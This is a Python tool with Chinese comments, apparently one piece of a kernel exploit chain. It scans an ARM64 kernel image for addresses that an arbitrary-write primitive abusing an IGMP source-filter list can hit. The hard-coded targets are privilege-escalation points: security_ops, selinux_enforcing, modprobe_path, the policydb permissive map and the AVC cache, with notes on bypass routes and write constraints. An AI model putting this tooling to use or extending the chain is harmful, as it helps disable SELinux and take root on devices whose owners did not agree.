#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
离线锚点扫描器 —— 回答"某个内核地址能不能被 kwrite 写"。

⚠️ 重要限制（2026-11-09 实测结论）
   artifacts/device/partitions/kimg.bin 经 `file` 判定是 "Linux kernel ARM64 boot executable Image"，
   即**启动镜像，不是运行时内存快照**：
     - .bss 符号在文件里是 0（运行时是大指针），锚点几何完全不同
     - security_ops 应为 0xffffffc001649388，文件里读到 0
     - selinux_ops 的 name 字段应为 "selinux"，文件里全 0
   因此本脚本对 .bss 目标的结论**不可信**。
   正确用法：先用 kread 从设备取一份真实内存到本地，替换 KIMG 后再扫描；
   或只用它扫 .data/.rodata 里的目标，并用一次 kread 抽样校准。

kwrite 的真实约束（probe79s.c，已对照 kernel-exact/net/ipv4/igmp.c 确认）：

    for k in 0..9:
        S = W - 24 - 4*k            # 假 ip_sf_socklist 的起点
        if u32(S + 4) != k: continue   # sl_count 必须恰好 == k
        if u32(S)     == k: continue   # sl_max 不能 == k（否则走 realloc + kfree_rcu）
        写入位置 = S + 24 + 4*k = W
        成功返回 0；一个都不满足返回 -2000

另有两条运行时约束（本脚本只报"几何"，不判这些）：
  * memcmp 去重：要写的值若等于 sl_addr[0..k-1]（即 W-4k..W-4）中任一个，内核视为重复，不写
  * 写入后 sl_count++，同一 W 在一 boot 内基本只能写一次

用法:
    python3 anchor_scan.py                # 检查预置清单
    python3 anchor_scan.py 0xffffffc00187bc18 ...
"""
import struct
import sys
import os

# 仓库根 = 本文件上溯三级；内核镜像在 artifacts/ 下（不入库）
REPO = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
KIMG = os.path.join(REPO, "artifacts", "device", "partitions", "kimg.bin")
BASE = 0xFFFFFFC000080000          # _text

# 预置清单：交接文档/评审里讨论过的目标
TARGETS = [
    ("security_ops",        0xFFFFFFC00187BC18, "路线C：改成 default_security_ops 的低 32 位"),
    ("selinux_enforcing",   0xFFFFFFC00187D47C, "probe78 报 -2000，这里复核"),
    ("selinux_enabled",     0xFFFFFFC001649380, "nf hook 缓解（评审 C.2）"),
    ("ss_initialized",      0xFFFFFFC001880B18, "已知可写：k=0 锚点"),
    ("modprobe_path",       0xFFFFFFC00162C990, "经典 modprobe 技巧"),
    ("selinux_ops",         0xFFFFFFC001649388, "函数表本体（.data）"),
    ("default_security_ops",0xFFFFFFC001645898, "cap 桩表本体"),
    ("policydb",            0xFFFFFFC001880930, "permissive_map 在这个结构里"),
    ("avc_cache",           0xFFFFFFC00187BC38, "评审 C.9 的 avc 投毒"),
]

data = open(KIMG, "rb").read()


def rd32(addr):
    off = addr - BASE
    if off < 0 or off + 4 > len(data):
        return None
    return struct.unpack("<I", data[off:off + 4])[0]


def rd64(addr):
    off = addr - BASE
    if off < 0 or off + 8 > len(data):
        return None
    return struct.unpack("<Q", data[off:off + 8])[0]


def anchors(W):
    """返回 [(k, sl_max, sl_count, S, dup_hits)]"""
    out = []
    for k in range(10):
        S = W - 24 - 4 * k
        sl_max = rd32(S)
        sl_count = rd32(S + 4)
        if sl_max is None or sl_count is None:
            continue
        if sl_count != k:
            continue
        if sl_max == k:
            continue
        # 去重窗口：sl_addr[0..k-1] = S+24 .. S+24+4(k-1) = W-4k .. W-4
        dup = [rd32(W - 4 * k + 4 * i) for i in range(k)]
        out.append((k, sl_max, sl_count, S, dup))
    return out


def show(name, W, note):
    print("=" * 78)
    print(f"{name}  @ 0x{W:016x}   ({note})")
    cur = rd32(W)
    cur64 = rd64(W)
    print(f"  当前值: u32=0x{cur:08x}   u64=0x{cur64:016x}" if cur is not None else "  越界")
    a = anchors(W)
    if not a:
        print("  ✗ 无锚点 —— 这个地址写入必返 -2000")
    else:
        print(f"  ✓ 可用锚点 {len(a)} 个:")
        for (k, mx, ct, S, dup) in a:
            print(f"    k={k}  S=0x{S:016x}  sl_max=0x{mx:08x}  sl_count={ct}")
            print(f"          副作用词: sl_max@0x{S:016x}  sl_count@0x{S+4:016x} 会 +1")
            if k:
                print(f"          去重窗口(要写的值不能等于): "
                      + " ".join(f"0x{v:08x}" for v in dup))
            else:
                print("          去重窗口为空（k=0，不会撞车）")


def sanity():
    print("#" * 78)
    print("# 先自检：地址换算 + 关键全局变量的当前值")
    print("#" * 78)
    hdr = rd32(BASE)
    print(f"_text 首 4 字节 = 0x{hdr:08x}  (arm64 Image: 应为 b stext, 形如 0x140000xx)")
    for nm, addr, expect in [
        ("selinux_enforcing", 0xFFFFFFC00187D47C, "1=Enforcing"),
        ("ss_initialized",    0xFFFFFFC001880B18, "1=策略已加载"),
        ("selinux_enabled",   0xFFFFFFC001649380, "1=启用"),
        ("security_ops",      0xFFFFFFC00187BC18, "应等于 &selinux_ops=0xffffffc001649388"),
        ("selinux_ops",       0xFFFFFFC001649388, "函数表首字段应像内核函数指针"),
        ("default_security_ops", 0xFFFFFFC001645898, "同上"),
        ("init_cred",         0xFFFFFFC00162DD20, "usage 应 >0"),
    ]:
        v32 = rd32(addr)
        print(f"  {nm:22s} @0x{addr:016x}  u32=0x{v32:08x}   u64=0x{rd64(addr):016x}   ({expect})")
    print()


if __name__ == "__main__":
    sanity()
    if len(sys.argv) > 1:
        for s in sys.argv[1:]:
            show("arg", int(s, 16), "命令行指定")
    else:
        for nm, addr, note in TARGETS:
            show(nm, addr, note)
